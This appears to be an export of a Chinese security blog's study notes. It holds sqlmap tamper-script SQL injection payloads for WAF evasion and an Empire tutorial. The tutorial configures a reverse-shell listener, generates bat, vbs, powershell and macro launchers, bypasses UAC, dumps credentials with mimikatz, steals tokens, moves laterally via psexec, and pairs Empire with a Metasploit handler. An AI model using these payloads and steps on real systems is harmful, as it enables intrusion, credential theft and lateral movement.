<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;IFNULL(1, 2)&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure>

<ol start="20">
<li>modsecurityversioned.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0</span><br><span class="line"></span><br><span class="line">作用：过滤空格，使用mysql内联注释的方式进行注入</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 2&gt;1--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 &#x2F;*!30874AND 2&gt;1*&#x2F;--</span><br></pre></td></tr></table></figure>

<ol start="21">
<li>space2mysqlblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1</span><br><span class="line"></span><br><span class="line">作用：将空格替换为其他空格符号(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Bid%0DFROM%0Cusers</span><br></pre></td></tr></table></figure>

<ol start="22">
<li>modsecurityzeroversioned.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.0</span><br><span class="line"></span><br><span class="line">作用：使用内联注释方式（&#x2F;*!00000*&#x2F;）进行注入</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 2&gt;1--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 &#x2F;*!00000AND 2&gt;1*&#x2F;--</span><br></pre></td></tr></table></figure>

<ol start="23">
<li>space2mysqldash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL、MSSQL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为 -- ，并追随一个换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1--%0AAND--%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="24">
<li>bluecoat.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：Blue Coat SGOS</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1,、SGOS</span><br><span class="line"></span><br><span class="line">作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换&#x3D;</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users where id &#x3D; 1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%09id FROM users where id LIKE 1</span><br></pre></td></tr></table></figure>

<ol start="25">
<li>versionedkeywords.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11</span><br><span class="line"></span><br><span class="line">作用：注释绕过</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION ALL SELECT NULL, NULL,</span><br><span class="line"></span><br><span class="line">CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS</span><br><span class="line"></span><br><span class="line">CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1&#x2F;*!UNION*&#x2F;&#x2F;*!ALL*&#x2F;&#x2F;*!SELECT*&#x2F;&#x2F;*!NULL*&#x2F;,&#x2F;*!NULL*&#x2F;,</span><br><span class="line"></span><br><span class="line">CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;*!AS*&#x2F;&#x2F;*!CHAR*&#x2F;),CHAR(</span><br><span class="line"></span><br><span class="line">32)),CHAR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure>

<ol start="26">
<li>halfversionedmorekeywords.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL &lt; 5.1</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 4.0.18&#x2F;5.0.22</span><br><span class="line"></span><br><span class="line">作用：在每个关键字前添加mysql版本注释</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;value&#39; UNION ALL SELECTCONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS</span><br><span class="line"></span><br><span class="line">CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNUL</span><br><span class="line"></span><br><span class="line">L(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58*</span><br><span class="line"></span><br><span class="line">*)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa</span><br></pre></td></tr></table></figure>

<ol start="27">
<li>space2morehash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MySQL &gt;&#x3D; 5.1.13</span><br><span class="line"></span><br><span class="line">测试通过数据库：MySQL 5.1.41</span><br><span class="line"></span><br><span class="line">作用：将空格替换为#，并添加一个随机字符串和换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="28">
<li>apostrophenullencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用非法双字节Unicode字符替换单引号</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1 AND &#39;1&#39;&#x3D;&#39;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND %00%271%00%27&#x3D;%00%271</span><br></pre></td></tr></table></figure>

<ol start="29">
<li>appendnullbyte.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：在有效载荷的结束位置加载null字节字符编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 1&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 1&#x3D;1%00</span><br></pre></td></tr></table></figure>

<ol start="30">
<li>chardoubleencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F</span><br><span class="line"></span><br><span class="line">%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>

<ol start="31">
<li>unmagicquotes.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1&#39; AND 1&#x3D;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1%bf%27 AND 1&#x3D;1--</span><br></pre></td></tr></table></figure>

<ol start="32">
<li>randomcomments.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用注释符分割sql关键字</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;INSERT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：I&#x2F;&#x2F;N&#x2F;&#x2F;SERT</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Empire工具基础用法</title>
    <url>/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeflnjm2wj31900u0npe.jpg" alt="88"></p>
<a id="more"></a>

<h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><p>​        Empire 是一款类似Metasploit 的渗透测试框架，基于python 编写，Empire是一个纯粹的PowerShell 后开发代理，建立在密码安全通信和灵活的架构上。Empire 实现了无需powershell.exe 即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。</p>
<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h3><p>下载地址： <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
<p>下载地址：<a href="https://github.com/interference-security/empire-web.git" target="_blank" rel="noopener">https://github.com/interference-security/empire-web.git</a>  (web版)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br><span class="line"></span><br><span class="line">切换至工具目录setup下</span><br><span class="line">	.&#x2F;install.sh</span><br><span class="line">出现setip comlete则安装成功</span><br><span class="line">	.&#x2F;reset.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhi9oq0tj316c0rkwn9.jpg" alt="image-20200210180914768"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">切换至主目录运行.&#x2F;empire，如果出现错误则使用pip安装模块即可</span><br><span class="line"></span><br><span class="line">若出现无pydispatcher模块名，则使用以下命令解决即可</span><br><span class="line">	pip install PyDispatcher</span><br><span class="line">	</span><br><span class="line">若出现No module named Crypto.Cipher</span><br><span class="line">	pip install pycrypto</span><br></pre></td></tr></table></figure>

<p>成功界面！</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbrhia8gi2j316u0oigpg.jpg" alt="image-20200210183146543"></p>
<h3 id="0x02-监听模块"><a href="#0x02-监听模块" class="headerlink" title="0x02 监听模块"></a>0x02 监听模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入监听模块</span><br><span class="line">	listeners</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izbyoej31hg0mggtx.jpg" alt="image-20200225133238490"></p>
<p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单</span><br><span class="line">back	</span><br><span class="line">	回到主菜单</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据</span><br><span class="line">delete	</span><br><span class="line">	从数据库中删除侦听器</span><br><span class="line">disable	</span><br><span class="line">	禁用禁用（停止）一个或所有侦听器。侦听器不会自动启动Empire</span><br><span class="line">edit	</span><br><span class="line">	编辑更改侦听器选项，在重新启动侦听器之前不会生效</span><br><span class="line">enable	</span><br><span class="line">	启用并启动一个或所有侦听器</span><br><span class="line">exit	</span><br><span class="line">	退出</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单</span><br><span class="line">info	</span><br><span class="line">	显示活动侦听器的信息</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或所有活跃的听众</span><br><span class="line">launcher	</span><br><span class="line">	为侦听器生成初始启动器</span><br><span class="line">list	</span><br><span class="line">	列出所有活动的侦听器（或代理）</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表</span><br><span class="line">uselistener	</span><br><span class="line">	使用帝国侦听器模块</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿</span><br></pre></td></tr></table></figure>





<p>监听方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">监听方法</span><br><span class="line">	http</span><br><span class="line">	https</span><br><span class="line">	</span><br><span class="line">修改监听名</span><br><span class="line">	set Name Time</span><br><span class="line"></span><br><span class="line">设置shell回弹地址</span><br><span class="line">	set Host http:&#x2F;&#x2F;192.168.43.239:8080</span><br><span class="line"></span><br><span class="line">设置监听端口</span><br><span class="line">	set Port 8080</span><br><span class="line"></span><br><span class="line">开启监听</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j8vgwej315w0u04j7.jpg" alt="image-20200225135923882"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixs46qj32ni060q7l.jpg" alt="image-20200225140922490"></p>
<h3 id="0x03-生成payload模块"><a href="#0x03-生成payload模块" class="headerlink" title="0x03 生成payload模块"></a>0x03 生成payload模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回主菜单，输入usestager （空格+tab）可显示当前能生成的payload</span><br><span class="line">根据目标系统选择对应payload</span><br><span class="line">本次目标系统为windows7</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iwk1maj32ni060q7l.jpg" alt="image-20200225142334385"></p>
<p>选择windows/launcher_bat模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_bat Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ixa7tqj317l0u04bi.jpg" alt="image-20200225143122716"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4h2cnj32xs0mae81.jpg" alt="image-20200225143504171"></p>
<p>接收反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6abfgj30zy04a75k.jpg" alt="image-20200225145039349"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j08jpuj31lw07cac1.jpg" alt="image-20200225145058252"></p>
<p>选择会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interact 2RH69CMK</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j4w4rwj31mi0fcn14.jpg" alt="image-20200225145810389"></p>
<p>选择windows/launcher_vbs模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_vbs Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j216soj32yi0o8kjl.jpg" alt="image-20200225160206353"></p>
<p>获取shell成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j6qqd8j31pu0dw79b.jpg" alt="image-20200225160405629"></p>
<p>另外一种直接生成shell方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows</span><br><span class="line">	launcher powershell Time</span><br><span class="line">在目标主机中直接运行，无文件落地，隐秘性较高</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j5q6dfj32ya0l8hdt.jpg" alt="image-20200225160843514"></p>
<p>反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j78rmmj32280fmn53.jpg" alt="image-20200225160955148"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux</span><br><span class="line">	launcher python Time</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97j80fvlj32y40p4axv.jpg" alt="image-20200225162205082"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97izugoej30vb0u0ncp.jpg" alt="image-20200225162330487"></p>
<p>宏反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows&#x2F;macro Time(监听器名称)</span><br><span class="line">生成</span><br><span class="line">	execute</span><br><span class="line">	</span><br><span class="line">将代码复制到execl的宏代码中运行</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97iymvyzj31340u0x1h.jpg" alt="image-20200225171313456"></p>
<p>反弹成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97ja1i8sj313k0u0tqq.jpg" alt="image-20200225170131670"></p>
<h3 id="0x04-代理会话-shell会话"><a href="#0x04-代理会话-shell会话" class="headerlink" title="0x04 代理会话(shell会话)"></a>0x04 代理会话(shell会话)</h3><p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agents	</span><br><span class="line">	跳转到代理菜单。</span><br><span class="line">autorun	</span><br><span class="line">	从文件读取并执行帝国命令列表，并在每个新代理上执行“autorun&lt;resource file&gt;&lt;agent language&gt;”，例如“autorun&#x2F;root&#x2F;ps.rc powershell”。或使用“自动运行清除”清除任何自动运行设置，并使用“自动运行显示”显示当前自动运行设置</span><br><span class="line">	</span><br><span class="line">back	</span><br><span class="line">	回到主菜单。</span><br><span class="line">clear	</span><br><span class="line">	清除一个或多个代理的任务。</span><br><span class="line">creds	</span><br><span class="line">	显示&#x2F;返回数据库中的凭据。</span><br><span class="line">exit	</span><br><span class="line">	退出。</span><br><span class="line">help	</span><br><span class="line">	显示帮助菜单。</span><br><span class="line">interact	</span><br><span class="line">	与特定代理交互。</span><br><span class="line">kill	</span><br><span class="line">	杀死一个或多个代理以退出任务。</span><br><span class="line">killdate	</span><br><span class="line">	设置一个或多个代理的kildate（kildate[agent&#x2F;all]01&#x2F;01&#x2F;2016）。</span><br><span class="line">list	</span><br><span class="line">	列表列出所有活动代理（或侦听器）。</span><br><span class="line">listeners	</span><br><span class="line">	跳转到“侦听器”菜单。</span><br><span class="line">lostlimit	</span><br><span class="line">	Task将一个或多个代理设置为“lostlimit[代理&#x2F;全部][错过的回调数]”</span><br><span class="line">main	</span><br><span class="line">	主菜单返回主菜单。</span><br><span class="line">remove	</span><br><span class="line">	从数据库中删除一个或多个代理。</span><br><span class="line">rename	</span><br><span class="line">	重命名重命名特定代理。</span><br><span class="line">resource	</span><br><span class="line">	从文件中读取并执行帝国命令列表。</span><br><span class="line">searchmodule	</span><br><span class="line">	搜索帝国模块名称&#x2F;描述。</span><br><span class="line">sleep	</span><br><span class="line">	睡眠任务一个或多个代理“睡眠[代理&#x2F;全部]间隔[抖动]”</span><br><span class="line">usemodule	</span><br><span class="line">	使用帝国PowerShell模块。</span><br><span class="line">usestager	</span><br><span class="line">	使用帝国雄鹿。</span><br><span class="line">workinghou	</span><br><span class="line">	工作时间设置一个或多个代理的工作时间（工作时间[代理&#x2F;全部]9:00-17:00）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list</span><br><span class="line">	查看会话列表</span><br><span class="line">用户处*代表最高权限</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz16kwvxj31l605640n.jpg" alt="image-20200227000538125"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list stale</span><br><span class="line">	列出已丢失会话代理</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p7igqyj31ne07sad4.jpg" alt="image-20200226023048893"></p>
<h3 id="0x05-UAC提权方法模块"><a href="#0x05-UAC提权方法模块" class="headerlink" title="0x05 UAC提权方法模块"></a>0x05 UAC提权方法模块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入会话，输入usemodule (空格+tab键)查看可使用模块</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97p94hgcj31jn0u0npd.jpg" alt="image-20200226023120588"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">	检测提权方法模块</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbzounsfrj30lw0cywf0.jpg" alt="image-20200228121225322"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UAC提权模块</span><br><span class="line">	bypassuac Time</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pb253fj31pw0r2qe6.jpg" alt="image-20200226023221559"></p>
<h3 id="0x06-信息收集"><a href="#0x06-信息收集" class="headerlink" title="0x06 信息收集"></a>0x06 信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps</span><br><span class="line">	查看进程</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc97pa31sdj30u00xodpf.jpg" alt="image-20200226023252724"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地管理组访问模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;find_localadmin_access</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988sof8gj31820iq79c.jpg" alt="image-20200226023409814"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加载mimikatz获取管理员hash</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988ryzutj313g0u0nde.jpg" alt="image-20200226023812869"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看用户及hash(包括明文)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988t6i2nj31fk096n00.jpg" alt="image-20200226023858797"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creds krbtgt </span><br><span class="line"> 	搜索特定用户的krbtgt</span><br><span class="line">creds plaintext </span><br><span class="line"> 	搜索hash中的明文</span><br><span class="line">creds hash </span><br><span class="line">	列出所有hash值</span><br><span class="line">creds export &#x2F;opt&#x2F;hash.csv </span><br><span class="line">	导出hash凭证到指定的格式</span><br><span class="line">	</span><br><span class="line">shell net localgroup administrators </span><br><span class="line">	查看管理员组</span><br><span class="line">shell ipconfig </span><br><span class="line">	查看IP地址</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户账号枚举模块</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;get_user</span><br><span class="line">可设置域名</span><br><span class="line">  set Domain hacker.testlab</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc988tth2yj30y80u0h41.jpg" alt="image-20200226024938492"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络用户会话登录情况</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;userhunter</span><br><span class="line">	</span><br><span class="line">网络扫描</span><br><span class="line">	shell ping -a -n 1 192.168.2.1</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">设置扫描范围</span><br><span class="line">	set Range 192.168.2.1-192.168.2.150</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz15m391j30vi0u0akv.jpg" alt="image-20200226141750252"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DNS信息获取</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;reverse_dns</span><br><span class="line"></span><br><span class="line">共享文件</span><br><span class="line">	usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;share_finder</span><br><span class="line">	set CheckShareAccess True</span><br><span class="line">	</span><br><span class="line">会话令牌偷取获取目标访问权限</span><br><span class="line">	ps cmd</span><br><span class="line">	steal_token  3716(PID)</span><br><span class="line">	shell dir \\HACKER(域名称)\c$</span><br><span class="line">	</span><br><span class="line">psexec模块横向生成一个反弹代理</span><br><span class="line">	usemodule lateral_movement&#x2F;invoke_psexec</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br><span class="line">	设置域名称</span><br><span class="line">	set ComputerName HACKER</span><br><span class="line">	</span><br><span class="line">会话注入得到反弹代理</span><br><span class="line">	ps cmd</span><br><span class="line">	选择反弹模块</span><br><span class="line">	usemodule management&#x2F;psinject</span><br><span class="line">	设置PID</span><br><span class="line">	set ProcId 2340</span><br><span class="line">	设置监听器名称</span><br><span class="line">	set Listener Time</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gcbz13b8lkj316j0u0tl7.jpg" alt="image-20200226201934966"></p>
<h3 id="0x07-Empire和MSF联动"><a href="#0x07-Empire和MSF联动" class="headerlink" title="0x07 Empire和MSF联动"></a>0x07 Empire和MSF联动</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Empire</span><br><span class="line">		usemodule code_execution&#x2F;invoke_shellcode</span><br><span class="line">		info</span><br><span class="line">		set Lhost 192.168.2.131</span><br><span class="line">		set Lport 4445</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Metasploit</span><br><span class="line">		use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">		set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">		set lhost 192.168.2.131</span><br><span class="line">    set lport 4445</span><br><span class="line">    set exitsession false</span><br><span class="line">    exploit -j</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>后渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp注入学习(暂未更新)</title>
    <url>/2020/06/13/Thinkphp%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfpzs12ludj31c00u0tfe.jpg" alt="74"></p>
<a id="more"></a>

]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>Thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt学习</title>
    <url>/2020/06/27/jwt%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg77oqkz42j31hc0u0jzn.jpg" alt="46"></p>
<a id="more"></a>

<h3 id="0x00-什么是JWT"><a href="#0x00-什么是JWT" class="headerlink" title="0x00 什么是JWT"></a>0x00 什么是JWT</h3><p>JWT是Json Web Token的缩写，主要用于验证用户身份信息及跨域的身份验证。</p>
<h3 id="0x01-JWT构成部分"><a href="#0x01-JWT构成部分" class="headerlink" title="0x01 JWT构成部分"></a>0x01 JWT构成部分</h3><p>JWT一般是由三部分组成。</p>
<h4 id="Header-标头"><a href="#Header-标头" class="headerlink" title="Header(标头)"></a>Header(标头)</h4><p>​    标头通常由两部分组成：令牌的类型和所使用的签名算法，例如HMACSHA256或RSA</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Header头部承载两部分信息</span><br><span class="line">	1、声明类型，JWT</span><br><span class="line">	2、声明加密算法	</span><br><span class="line"></span><br><span class="line">header &#x3D; &#39;&#123;</span><br><span class="line">		&quot;alg&quot;:&quot;HS256&quot;,&#x2F;&#x2F;算法</span><br><span class="line">		&quot;typ&quot;:&quot;JWT&quot; &#x2F;&#x2F;JWT传递</span><br><span class="line">		&#125;&#39;</span><br><span class="line">		</span><br><span class="line">使用base64URL编码，形成JWT的第一部分</span><br></pre></td></tr></table></figure>

